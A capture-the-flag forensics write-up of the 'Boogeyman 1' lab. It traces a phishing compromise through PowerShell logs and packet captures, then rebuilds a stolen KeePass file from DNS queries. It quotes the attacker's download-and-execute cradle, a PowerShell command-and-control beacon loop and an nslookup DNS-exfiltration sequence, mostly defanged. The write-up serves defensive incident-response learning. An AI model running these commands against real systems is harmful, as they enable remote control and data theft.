# Boogeyman 1

## Overview

Julianne, a finance employee working for Quick Logistics LLC, received a follow-up email regarding an unpaid invoice from their business partner, B Packaging Inc. Unbeknownst to her, the attached document was malicious and compromised her workstation.

<img width="763" height="303" alt="28bbc4ff07b8ad16da155894ca3d2d73" src="https://github.com/user-attachments/assets/6cb64e30-4eec-407b-8f94-96b932999d35" />

The security team was able to flag the suspicious execution of the attachment, in addition to the phishing reports received from the other finance department employees, making it seem to be a targeted attack on the finance team. Upon checking the latest trends, the initial TTP used for the malicious attachment is attributed to the new threat group named Boogeyman, known for targeting the logistics sector. Our job is to analyse and assess the impact of the compromise.

We are given the following artefacts:

- Copy of the phishing email (`dump.eml`)
- Powershell Logs from Julianne's workstation (`powershell.json`)
- Packet capture from the same workstation (`capture.pcapng`)

## Investigation

### Email Analysis

We are able to extract findings from the provided [dump.eml](./dump.eml) file, such as sender and victim email address, name of the file inside the encrypted attachment and more. We also have a Base64 encoded payload:

```text
aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
```

Using [Cyberchef](https://gchq.github.io/CyberChef/), we are able to decrypt the payload and see the malicious command:

```bash
iex (new-object net[.]webclient).downloadstring('hxxp[://]files[.]bpakcaging[.]xyz/update')
```

This seems to be downloading a file from a malicious file hosting domain. At this point in our investigation, it is a good idea to pivot to the powershell logs.

### Downloaded Files

Using `jq`, a lightweight CLI tool for processing json files, we can view the structured data. We can see that the data follows structure similar to the following:

```json
{
  "Timestamp": "2023-01-13 17:12:18.427585Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 558,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.OriginInfo }",
  "ScriptBlockId": "349ed1ba-3ba0-4bca-9bc3-1dc465922c1c",
  "Path": null
}
```

Now lets assume that the attacker used domains for file hosting and C2 (command & control) by making `http` requests. We can see the requests made by using the following command:

```bash
ubuntu@tryhackme:~/Desktop/artefacts$ cat powershell[.]json | jq {ScriptBlockText} | grep http
  "ScriptBlockText": "iex(new-object net[.]webclient).downloadstring('hxxps[://]github[.]com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt[.]ps1');pwd"
  "ScriptBlockText": "$s='cdn[.]bpakcaging[.]xyz:8080';$i='8cce49b0-b86459bb-27fe2489';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/8cce49b0 -Headers @{\"X-38d2-8f49\"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/b86459bb -Headers @{\"X-38d2-8f49\"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/27fe2489 -Method POST -Headers @{\"X-38d2-8f49\"=$i} -Body ([System[.]Text[.]Encoding][:][:]UTF8[.]GetBytes($e+$r) -join ' ')} sleep 0.8}\n"
  "ScriptBlockText": "iex (new-object net[.]webclient).downloadstring('hxxp[://]files[.]bpakcaging[.]xyz/update')"
  "ScriptBlockText": "iwr hxxp[://]files[.]bpakcaging[.]xyz/sb[.]exe -outfile sb[.]exe;pwd"
  "ScriptBlockText": "iwr hxxp[://]files[.]bpakcaging[.]xyz/sq3[.]exe -outfile sq3[.]exe;pwd"

```

**Note:** I have defanged the output for safety/security

The attacker sends an initial beacon to `hxxp[://]cdn[.]bpakcaging[.]xyz:8080/8cce49b0` for C2, and then continously checks in with `hxxp[://]cdn[.]bpakcaging[.]xyz:8080/b86459bb` to retrieve attacker commands. It then executes the retrieved commands, and send the results back to `hxxp[://]cdn[.]bpakcaging[.]xyz:8080/27fe2489`.

The attacker also downloaded a `seatbelt.exe` file, `sb.exe` and `sq3.exe`. Although the domain `files[.]bpakcaging[.]xyz` does not exist, I researched that `seatbelt.exe` is a C# tool used for enumeration and information gathering. We can confirm the execution of `seatbelt.exe`:

```bash
ubuntu@tryhackme:~/Desktop/artefacts$ cat powershell[.]json | jq {ScriptBlockText} | grep seatbelt[.]exe -i
  "ScriptBlockText": "Seatbelt[.]exe -group=user;pwd"
```

We can also see the use of the `sb.exe` file, which also seems to be a sort of enumeration tool:

```bash
ubuntu@tryhackme:~/Desktop/artefacts$ cat powershell[.]json | jq {ScriptBlockText} | grep sb[.]exe   
  "ScriptBlockText": ".\\sb[.]exe -group=all;pwd"
  "ScriptBlockText": ".\\sb[.]exe;pwd"
  "ScriptBlockText": ".\\sb[.]exe system;pwd"
  "ScriptBlockText": ".\\sb[.]exe all;pwd"
  "ScriptBlockText": "iwr hxxp[://]files[.]bpakcaging[.]xyz/sb[.]exe -outfile sb[.]exe;pwd"
  "ScriptBlockText": ".\\sb[.]exe -group=user;pwd"
```

Now lets see if a file was accessed by the `sq3.exe` binary, which seems to be a tool to interact with database files:

```bash
ubuntu@tryhackme:~/Desktop/artefacts$ cat powershell[.]json | jq {ScriptBlockText} | grep sq3[.]exe -i     
  "ScriptBlockText": ".\\Music\\sq3[.]exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum[.]sqlite \"SELECT * from NOTE limit 100\";pwd"
  "ScriptBlockText": ".\\sq3[.]exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\;pwd"
  "ScriptBlockText": "iwr hxxp[://]files[.]bpakcaging[.]xyz/sq3[.]exe -outfile sq3[.]exe;pwd"
```

It looks like `plum.sqlite` was accessed by the binary file.

### Data exfiltration

Let us look at other commands run by the intruder:

```bash
ubuntu@tryhackme:~/Desktop/artefacts$ cat powershell[.]json | jq {ScriptBlockText} | sort | uniq
  "ScriptBlockText": "$file='C:\\Users\\j[.]westcott\\Documents\\protected_data.kdbx'; $destination = \"167[.]71[.]211[.]113\"; $bytes = [System[.]IO[.]File][:][:]ReadAllBytes($file);;pwd"
  "ScriptBlockText": "$file='protected_data.kdbx'; $destination = \"167[.]71[.]211[.]113\"; $bytes = [System[.]IO[.]File][:][:]ReadAllBytes($file);;pwd"
  "ScriptBlockText": "$hex = ($bytes|ForEach-Object ToString X2) -join '';;pwd"
  "ScriptBlockText": "$s='cdn[.]bpakcaging[.]xyz:8080';$i='8cce49b0-b86459bb-27fe2489';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/8cce49b0 -Headers @{\"X-38d2-8f49\"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/b86459bb -Headers @{\"X-38d2-8f49\"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/27fe2489 -Method POST -Headers @{\"X-38d2-8f49\"=$i} -Body ([System[.]Text[.]Encoding][:][:]UTF8[.]GetBytes($e+$r) -join ' ')} sleep 0.8}\n"
  "ScriptBlockText": "$split = $hex -split '(\\S{50})'; ForEach ($line in $split) { nslookup -q=A \"$line[.]bpakcaging[.]xyz\" $destination;} echo \"Done\";;pwd"
  ...
```

We get some interesting output. It seems like the intruder has exfiltrated the `protected_data.kdbx` file to the IP `167[.]71[.]211[.]113`. They hex encoded the bytes/data of the file using the following command:

```bash
$hex = ($bytes|ForEach-Object ToString X2) -join '';;pwd
```

The intruder then used `nslookup`, which performs DNS queries, to exfiltrate the hex encoded data as a subdomain of the `bpakcaging[.]xyz` domain.

### Network Analysis

Now that we know the attacker was able to exfiltrate two files to `bpakcaging[.]xyz`, we can look at the packet capture using Wireshark.

Since we were able to see the IP and host name of the file hosting server that the attacker used, we can prepare a filter in Wireshark to see the server's `http` responses:

<img width="1917" height="630" alt="Screenshot 2025-09-12 220533" src="https://github.com/user-attachments/assets/525e80a9-a08f-4eac-84b5-f60bf0263577" />

We can see that the attacker is using Python's SimpleHTTP server.

Additionally, we can also view the requests and responses to the C2 server with the host name `cdn[.]bpakcaging[.]xyz:8080`. The `GET` requests did not show anything of high interest, but looking at the `POST` requests, we see the following:

<img width="1908" height="906" alt="Screenshot 2025-09-12 222346" src="https://github.com/user-attachments/assets/f25c8de7-c0b4-42b3-9a2b-9c04b1547b1e" />

Decoding the encoded data in the body of the `POST` request using [Cyberchef](https://gchq.github.io/CyberChef/), we can see the the attacker is sending the output of the commands being run on the victim machine back to the malicious server.

Now lets look at the `protected_data.kdbx` exfiltrated file. We know that the attacker used `nslookup`, a tool used for making DNS requests, to exfiltrate the file to the `bpakcaging[.]xyz` domain. The attacker has explicitly set the DNS server to serve these requests with an IP of `167[.]71[.]211[.]113`. Therefore, we can set the Wireshark filter appropriately and we get the following results:

<img width="1917" height="858" alt="Screenshot 2025-09-13 132405" src="https://github.com/user-attachments/assets/db00df84-d590-4188-a797-4cdf79a35dea" />

### File reconstruction

Recall that the subdomain contained hex encoded data of the exfiltrated file. If we want to reconstruct the data, using Wireshark will not be too helpful for us since we would need to decode all the subdomains back to its original form. Lets switch over to TShark for the added CLI ability to extract and format the relevant data.

We can then run the following command using TShark:

```bash
ubuntu@tryhackme:~/Desktop/artefacts$ tshark -r capture.pcapng -Y 'ip.dst == 167.71.211.113 and dns and dns.qry.name contains "bpakcaging.xyz"'                          
47772 1797.245223 10.10.182.255 ? 167.71.211.113 DNS 163 Standard query 0x0002 A 03D9A29A67FB4BB50100030002100031C1F2E6BF714350BE58.bpakcaging.xyz.eu-west-1.ec2-utilities.amazonaws.com
47774 1797.431661 10.10.182.255 ? 167.71.211.113 DNS 152 Standard query 0x0003 A 03D9A29A67FB4BB50100030002100031C1F2E6BF714350BE58.bpakcaging.xyz.eu-west-1.compute.internal
47776 1797.609447 10.10.182.255 ? 167.71.211.113 DNS 125 Standard query 0x0004 A 03D9A29A67FB4BB50100030002100031C1F2E6BF714350BE58.bpakcaging.xyz
47782 1798.471118 10.10.182.255 ? 167.71.211.113 DNS 163 Standard query 0x0002 A 05216AFC5AFF03040001000000042000AF4DE7A467FADFBFEB.bpakcaging.xyz.eu-west-1.ec2-utilities.amazonaws.com
47784 1798.656750 10.10.182.255 ? 167.71.211.113 DNS 152 Standard query 0x0003 A 05216AFC5AFF03040001000000042000AF4DE7A467FADFBFEB.bpakcaging.xyz.eu-west-1.compute.internal
47786 1798.825166 10.10.182.255 ? 167.71.211.113 DNS 125 Standard query 0x0004 A 05216AFC5AFF03040001000000042000AF4DE7A467FADFBFEB.bpakcaging.xyz
47792 1799.752241 10.10.182.255 ? 167.71.211.113 DNS 163 Standard query 0x0002 A EB78AE194B03926333E0CC968727A1FF8CC4CD5151FAAC0520.bpakcaging.xyz.eu-west-1.ec2-utilities.amazonaws.com
47794 1799.935720 10.10.182.255 ? 167.71.211.113 DNS 152 Standard query 0x0003 A EB78AE194B03926333E0CC968727A1FF8CC4CD5151FAAC0520.bpakcaging.xyz.eu-west-1.compute.internal
...
```

With the above command, we get the data we want but we also get a lot of clutter with it. So lets create a command to clean everything up to get our data ready to re-create the exfiltrated file:

```bash
tshark -r capture.pcapng -Y 'ip.dst == 167.71.211.113 and dns and dns.qry.name contains "bpakcaging.xyz"' -T fields -e dns.qry.name | cut -d '.' -f1 | uniq | tr -d '\n' > protected_data_hex
```

What we did with this command is apply the same filter as we did in Wireshark, display just the query names, clean the output, and save it to a file. We can now finally convert this file back to its original form like so:

```bash
cat protected_data_hex | xxd -r -p > protected_data.kdbx
```

Where `xxd` is a tool used to convert hexadecimal representation to ASCII.

When we now try to open our reconstructed `protected_data.kdbx` file, we are asked for a password - but where do we find that? Perhaps it could be stored in the database file (`plum.sqlite`) that the attacker accessed using `sq3.exe`? Looking at the timestamp of `2023-01-13 17:25:38.759011Z` of when the file was accessed, lets check for Wireshark logs during the C2 connection around the same time to see if we can spot the password.

<img width="1913" height="907" alt="Screenshot 2025-09-13 140122" src="https://github.com/user-attachments/assets/b43e4e64-7371-43f6-94b5-45dafe072d21" />

Looking at the log immediately after the above timestamp, we were able to decode the data sent in the the log to spot a password! Once we entered the password to unlock the file, we are able to see sensitive information:

<img width="981" height="617" alt="Screenshot 2025-09-13 141435" src="https://github.com/user-attachments/assets/fe8f2c16-bacd-437d-8b13-f8c8cfa6275f" />

---

## Lessons Learned

- Phishing remains a major entry point — even a simple email can lead to severe compromise if users are not cautious.
- Defense in depth is key — email filters, endpoint protection, and network monitoring should work together to catch what slips past.
- Logs are invaluable — PowerShell logs and packet captures were essential in reconstructing attacker activity and exfiltration.
- DNS can be abused for exfiltration — monitoring long/random DNS queries should be part of security baselines.
- Correlation strengthens analysis — matching PowerShell events, file system access, and PCAP traffic helped piece together the full attack chain.
